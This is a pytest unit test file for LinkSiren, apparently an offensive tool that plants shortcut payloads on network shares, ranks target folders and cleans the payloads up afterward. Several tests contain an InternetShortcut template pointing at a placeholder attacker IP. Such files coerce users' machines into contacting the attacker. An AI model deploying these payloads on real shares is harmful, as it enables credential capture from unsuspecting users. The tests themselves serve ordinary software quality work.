"""
This module contains unit tests for the mode handlers in the LinkSiren application.
The tests cover the following functionalities:
- Generating payloads with valid and invalid names.
- Generating payloads from templates.
- Ranking targets based on specified criteria.
- Identifying targets based on specified criteria.
- Deploying payloads to targets with valid and invalid names.
- Deploying payloads from templates.
- Writing payloads to specified paths.
- Cleaning up deployed payloads from targets.

Fixtures:
    args: A MagicMock object to simulate command-line arguments.
    domain: A string representing the domain name for authentication.
    username: A string representing the username for authentication.
    password: A string representing the password for authentication.

Test Functions:
    test_handle_generate_invalid_payload_name(args):
        Tests the handle_generate function with an invalid payload name.
    test_handle_generate_valid_payload_name(args):
        Tests the handle_generate function with a valid payload name.
    test_handle_generate_payload_from_template(args):
        Tests the handle_generate function with a payload generated from a template.
    test_handle_rank(args, domain, username, password):
        Tests the handle_rank function with specified arguments.
    test_handle_identify(args, domain, username, password):
        Tests the handle_identify function with specified arguments.
    test_handle_deploy_invalid_payload_name(args, domain, username, password):
        Tests the handle_deploy function with an invalid payload name.
    test_handle_deploy_valid_payload_name(args, domain, username, password):
        Tests the handle_deploy function with a valid payload name.
    test_handle_deploy_payload_from_template(args, domain, username, password):
        Tests the handle_deploy function with a payload generated from a template.
    test_handle_deploy_write_payload(args, domain, username, password):
        Tests the handle_deploy function by writing the payload to specified paths.
    test_handle_cleanup(args, domain, username, password):
        Tests the handle_cleanup function by deleting the payload from targets.
    test_handle_cleanup_multiple_targets(args, domain, username, password):
        Tests the handle_cleanup function with multiple targets.
    test_handle_cleanup_no_targets(args, domain, username, password):
        Tests the handle_cleanup function when there are no targets.
"""
from unittest.mock import MagicMock, patch
from pathlib import Path
import pytest
from linksiren.mode_handlers import (
    handle_generate,
    handle_rank,
    handle_identify,
    handle_deploy,
    handle_cleanup,
)


@pytest.fixture
def args():
    """
    Returns:
        MagicMock: A mock object that can be used to simulate command line arguments.
    """
    return MagicMock()


@pytest.fixture
def domain():
    """
    Returns the test domain.

    Returns:
        str: The string "test_domain".
    """
    return "test_domain"


@pytest.fixture
def username():
    """
    Returns the username for testing purposes.

    Returns:
        str: A string representing the test username.
    """
    return "test_user"


@pytest.fixture
def password():
    """
    Returns:
        str: A test password string.
    """
    return "test_password"


def test_handle_generate_invalid_payload_name(args):
    """
    Test the handle_generate function with an invalid payload name.

    Args:
        args: An object containing the payload attribute to be tested.

    Setup:
        - Mocks the is_valid_payload_name function to return False.

    Test:
        - Sets args.payload to "invalid_payload.txt".
        - Calls the handle_generate function with the mocked args.
        - Asserts that the file specified in args.payload does not exist.
    """
    args.payload = "invalid_payload.txt"
    with patch("linksiren.mode_handlers.is_valid_payload_name", return_value=False):
        handle_generate(args)
        assert not Path(args.payload).exists()


def test_handle_generate_valid_payload_name(args):
    """
    Test the handle_generate function with a valid payload name.

    This test verifies that the handle_generate function correctly processes
    a valid payload name by performing the following steps:
    1. Sets the payload and attacker attributes of the args object.
    2. Mocks the is_valid_payload_name function to return True.
    3. Mocks the get_lnk_template function to return a template string.
    4. Mocks the create_lnk_payload function to return the payload contents.
    5. Mocks the write_payload_local function and verifies it is called once
       with the correct arguments.

    Args:
        args: An object containing the payload and attacker attributes.
    """
    args.payload = "payload.lnk"
    args.attacker = "attacker_ip"
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.get_lnk_template", return_value="lnk_template"),
        patch(
            "linksiren.mode_handlers.create_lnk_payload",
            return_value="payload_contents",
        ),
        patch(
            "linksiren.mode_handlers.write_payload_local"
        ) as mock_write_payload_local,
    ):
        handle_generate(args)
        mock_write_payload_local.assert_called_once_with(
            args.payload, "payload_contents"
        )


def test_handle_generate_payload_from_template(args):
    """
    Test the handle_generate function to ensure it correctly generates a payload
    from a template.
    This test mocks the following:
    - `is_valid_payload_name` to always return True.
    - `Path.open` to simulate reading from a file.
    - `write_payload_local` to verify it is called with the correct arguments.
    Args:
        args: An object with the following attributes:
            - payload: The name of the payload file.
            - attacker: The attacker's IP address.
    The test performs the following steps:
    1. Sets up the `args` object with a payload name and attacker IP.
    2. Defines a template content string with placeholders for the attacker IP.
    3. Mocks the necessary functions and methods.
    4. Simulates reading the template content from a file.
    5. Calls the `handle_generate` function with the `args` object.
    6. Asserts that `write_payload_local` is called once with the expected payload
       contents, formatted with the attacker's IP address.
    """
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    template_content = (
        "[InternetShortcut]\n"
        + "URL=http://{attacker_ip}/test\n"
        + "WorkingDirectory=C:\\WINDOWS\\\n"
        + "IconIndex=153\n"
        + "IconFile=C:\\Windows\\System32\\imageres.dll"
    )

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.Path.open", new_callable=MagicMock) as mock_open,
        patch(
            "linksiren.mode_handlers.write_payload_local"
        ) as mock_write_payload_local,
    ):

        mock_open.return_value.__enter__.return_value.read.return_value = (
            template_content
        )

        handle_generate(args)

        expected_payload_contents = template_content.format(attacker_ip=args.attacker)
        mock_write_payload_local.assert_called_once_with(
            args.payload, expected_payload_contents
        )


def test_handle_rank(args, domain, username, password):
    """
    Test the handle_rank function.

    This test verifies that the handle_rank function correctly processes the
    given arguments and performs the expected file operations. It patches
    several functions and methods to isolate the behavior of handle_rank and
    ensure it interacts with the file system as expected.

    Args:
        args: An object containing the arguments for the handle_rank function.
        domain (str): The domain to be processed.
        username (str): The username for authentication.
        password (str): The password for authentication.

    Patches:
        - linksiren.mode_handlers.read_targets: Mocked to return an empty list.
        - linksiren.mode_handlers.get_sorted_rankings: Mocked to return an empty dictionary.
        - builtins.open: Mocked to simulate file opening and writing.

    Asserts:
        - The open function is called once with the expected file name and mode.
    """
    args.active_threshold = 30
    args.targets = "targets.json"
    args.max_depth = 3
    args.fast = False
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[]),
        patch("linksiren.mode_handlers.get_sorted_rankings", return_value={}),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
    ):
        handle_rank(args, domain, username, password)
        mock_open.assert_called_once_with(
            "folder_rankings.txt", mode="w", encoding="utf-8"
        )


def test_handle_identify(args, domain, username, password):
    """
    Unit test for the handle_identify function in the LinkSiren application.

    This test verifies that the handle_identify function correctly processes the given arguments
    and calls the write_list_to_file function with the expected parameters.

    Args:
        args: An object containing various attributes used by the handle_identify function.
        domain (str): The domain to be used in the handle_identify function.
        username (str): The username to be used in the handle_identify function.
        password (str): The password to be used in the handle_identify function.

    Patches:
        - linksiren.mode_handlers.read_targets: Mocked to return an empty list.
        - linksiren.mode_handlers.get_sorted_rankings: Mocked to return an empty dictionary.
        - linksiren.mode_handlers.filter_targets: Mocked to return an empty list.
        - linksiren.mode_handlers.write_list_to_file: Mocked to track calls and verify the expected
            behavior.

    Asserts:
        - Verifies that write_list_to_file is called once with an empty list and
            "folder_targets.txt" as arguments.
    """
    args.active_threshold = 30
    args.targets = "targets.json"
    args.max_depth = 3
    args.fast = False
    args.max_folders_per_target = 5
    with (
        patch("linksiren.mode_handlers.read_targets", return_value=[]),
        patch("linksiren.mode_handlers.get_sorted_rankings", return_value={}),
        patch("linksiren.mode_handlers.filter_targets", return_value=[]),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        handle_identify(args, domain, username, password)
        mock_write_list_to_file.assert_called_once_with([], "folder_targets.txt")


def test_handle_deploy_invalid_payload_name(args, domain, username, password):
    """
    Test the handle_deploy function with an invalid payload name.

    This test sets up a scenario where the payload name is invalid and verifies
    that the handle_deploy function behaves correctly by ensuring the payload
    file does not exist after the function is called.

    Args:
        args: The arguments object containing the payload attribute.
        domain (str): The domain name.
        username (str): The username.
        password (str): The password.

    Patches:
        linksiren.mode_handlers.read_targets: Mocked to return a list of targets.
        linksiren.mode_handlers.is_valid_payload_name: Mocked to return False.

    Asserts:
        The payload file does not exist after handle_deploy is called.
    """
    domain = "test_domain"
    username = "test_user"
    password = "test_password"
    args.payload = "invalid_payload.txt"
    with (
        patch(
            "linksiren.mode_handlers.read_targets",
            return_value=["\\\\test_host\\test_share"],
        ),
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=False),
    ):
        handle_deploy(args, domain, username, password)
        assert not Path(args.payload).exists()


def test_handle_deploy_valid_payload_name(args, domain, username, password):
    """
    Test the handle_deploy function with a valid payload name.

    This test verifies that the handle_deploy function correctly processes a valid payload name
    and performs the expected operations, including reading targets, creating a payload, and
    writing the payloads to a file.

    Args:
        args: An object containing the payload, attacker, and targets attributes.
        domain: The domain to be used in the deployment.
        username: The username to be used in the deployment.
        password: The password to be used in the deployment.

    Mocks:
        - linksiren.mode_handlers.is_valid_payload_name: Mocked to always return True.
        - linksiren.mode_handlers.read_targets: Mocked to return a list containing a MagicMock
            object.
        - linksiren.mode_handlers.get_lnk_template: Mocked to return "lnk_template".
        - linksiren.mode_handlers.create_lnk_payload: Mocked to return "payload_contents".
        - linksiren.mode_handlers.write_list_to_file: Mocked to track calls to the function.

    Asserts:
        - Verifies that write_list_to_file is called once with the expected arguments.
    """
    args.payload = "payload.lnk"
    args.attacker = "attacker_ip"
    args.targets = "targets.json"
    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock()]),
        patch("linksiren.mode_handlers.get_lnk_template", return_value="lnk_template"),
        patch(
            "linksiren.mode_handlers.create_lnk_payload",
            return_value="payload_contents",
        ),
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):
        handle_deploy(args, domain, username, password)
        mock_write_list_to_file.assert_called_once_with([], "payloads_written.txt", "a")


def test_handle_deploy_payload_from_template(args, domain, username, password):
    """
    Test the handle_deploy function with a payload from a template.
    This test verifies that the handle_deploy function correctly processes a payload
    from a template file and writes the expected output to a file. It mocks several
    dependencies to isolate the function's behavior.
    Args:
        args: An object containing the payload, attacker, and targets attributes.
        domain (str): The domain to be used in the deployment.
        username (str): The username for authentication.
        password (str): The password for authentication.
    Mocks:
        - linksiren.mode_handlers.is_valid_payload_name: Always returns True.
        - linksiren.mode_handlers.read_targets: Returns a list with a MagicMock object.
        - builtins.open: Mocks the open function to return the template content.
        - linksiren.mode_handlers.write_list_to_file: Mocked to track calls.
    Asserts:
        - The write_list_to_file function is called once with the expected arguments.
    """
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    args.targets = "targets.json"
    template_content = (
        "[InternetShortcut]\n"
        + "URL=http://{attacker_ip}/test\n"
        + "WorkingDirectory=C:\\WINDOWS\\\n"
        + "IconIndex=153\n"
        + "IconFile=C:\\Windows\\System32\\imageres.dll"
    )

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[MagicMock()]),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):

        mock_open.return_value.__enter__.return_value.read.return_value = (
            template_content
        )

        handle_deploy(args, domain, username, password)

        mock_write_list_to_file.assert_called_once_with([], "payloads_written.txt", "a")


def test_handle_deploy_write_payload(args, domain, username, password):
    """
    Test the handle_deploy function to ensure it correctly writes the payload to the target.
    This test mocks several dependencies to isolate the functionality of handle_deploy:
    - Validates the payload name.
    - Reads the target information.
    - Opens and reads the template content.
    - Writes the payload to the target.
    - Writes the list of payloads to a file.

    Args:
        args: An object containing the payload, attacker IP, and targets file.
        domain: The domain to deploy the payload to.
        username: The username for authentication.
        password: The password for authentication.

    Mocks:
        - linksiren.mode_handlers.is_valid_payload_name: Always returns True.
        - linksiren.mode_handlers.read_targets: Returns a mock target.
        - builtins.open: Mocks the file opening and reading process.
        - linksiren.mode_handlers.write_list_to_file: Mocks the file writing process.

    Asserts:
        - The payload is written to the correct path with the expected content.
        - The list of payloads is written to the specified file.
    """
    args.payload = "payload.url"
    args.attacker = "attacker_ip"
    args.targets = "targets.json"
    template_content = (
        "[InternetShortcut]\n"
        + "URL=http://{attacker_ip}/test\n"
        + "WorkingDirectory=C:\\WINDOWS\\\n"
        + "IconIndex=153\n"
        + "IconFile=C:\\Windows\\System32\\imageres.dll"
    )
    mock_target = MagicMock()
    mock_target.host = "test_host"
    mock_target.paths = ["test_path"]

    with (
        patch("linksiren.mode_handlers.is_valid_payload_name", return_value=True),
        patch("linksiren.mode_handlers.read_targets", return_value=[mock_target]),
        patch("builtins.open", new_callable=MagicMock) as mock_open,
        patch("linksiren.mode_handlers.write_list_to_file") as mock_write_list_to_file,
    ):

        mock_open.return_value.__enter__.return_value.read.return_value = (
            template_content
        )
        mock_target.write_payload.return_value = True

        handle_deploy(args, domain, username, password)

        expected_payload_contents = template_content.format(attacker_ip=args.attacker)
        mock_target.write_payload.assert_called_once_with(
            path="test_path",
            payload_name=args.payload,
            payload=expected_payload_contents,
        )
        mock_write_list_to_file.assert_called_once_with(
            [r"\\test_host\test_path"], "payloads_written.txt", "a"
        )


def test_handle_cleanup(args, domain, username, password):
    """
    Test the handle_cleanup function.
    This test verifies that the handle_cleanup function correctly:
    - Sets the payload attribute of the args object.
    - Reads the target hosts using the read_targets function.
    - Connects to the target host with the provided username, password, and domain.
    - Deletes the payload from the target host's specified path.

    Args:
        args: An object with a payload attribute.
        domain (str): The domain to connect to.
        username (str): The username to use for authentication.
        password (str): The password to use for authentication.
    """
    args.payload = "payload.url"
    mock_target = MagicMock()
    mock_target.host = "test_host"
    mock_target.paths = ["test_path"]

    with patch("linksiren.mode_handlers.read_targets", return_value=[mock_target]):
        handle_cleanup(args, domain, username, password)
        mock_target.connect.assert_called_once_with(
            user=username, password=password, domain=domain
        )
        mock_target.delete_payload.assert_called_once_with("test_path", args.payload)


def test_handle_cleanup_multiple_targets(args, domain, username, password):
    """
    Test the handle_cleanup function with multiple target hosts.
    This test verifies that the handle_cleanup function correctly handles
    multiple target hosts by:
    - Connecting to each target with the provided username, password, and domain.
    - Deleting the specified payload from each target's paths.

    Args:
        args: An object containing the payload attribute.
        domain (str): The domain to connect to.
        username (str): The username to use for authentication.
        password (str): The password to use for authentication.

    Mocks:
        - linksiren.mode_handlers.read_targets: Mocked to return two target hosts.
        - mock_target1 and mock_target2: Mocked target hosts with specified hostnames and paths.

    Asserts:
        - The connect method is called once for each target with the correct arguments.
        - The delete_payload method is called once for each target with the correct path and
            payload.
    """
    args.payload = "payload.url"
    mock_target1 = MagicMock()
    mock_target1.host = "test_host1"
    mock_target1.paths = ["test_path1"]
    mock_target2 = MagicMock()
    mock_target2.host = "test_host2"
    mock_target2.paths = ["test_path2"]

    with patch(
        "linksiren.mode_handlers.read_targets",
        return_value=[mock_target1, mock_target2],
    ):
        handle_cleanup(args, domain, username, password)
        mock_target1.connect.assert_called_once_with(
            user=username, password=password, domain=domain
        )
        mock_target1.delete_payload.assert_called_once_with("test_path1", args.payload)
        mock_target2.connect.assert_called_once_with(
            user=username, password=password, domain=domain
        )
        mock_target2.delete_payload.assert_called_once_with("test_path2", args.payload)


def test_handle_cleanup_no_targets(args, domain, username, password):
    """
    Test the handle_cleanup function when there are no targets.
    This test verifies that the handle_cleanup function behaves correctly
    when the read_targets function returns an empty list, indicating that
    there are no targets to process. The function should handle this case
    gracefully without attempting to connect or delete the payload.
    Args:
        args: An object containing the payload attribute.
        domain: The domain to be used in the cleanup process.
        username: The username for authentication.
        password: The password for authentication.
    Setup:
        - Mock the read_targets function to return an empty list.
    Test Steps:
        1. Set the payload attribute of args.
        2. Mock the read_targets function to return an empty list.
        3. Call the handle_cleanup function with the provided arguments.
    Expected Result:
        - The handle_cleanup function should complete without errors.
        - No connections or deletions should be attempted since there are no targets.
    """
    args.payload = "payload.url"

    with patch("linksiren.mode_handlers.read_targets", return_value=[]):
        handle_cleanup(args, domain, username, password)
        # No targets to connect or delete payload from, so no assertions needed
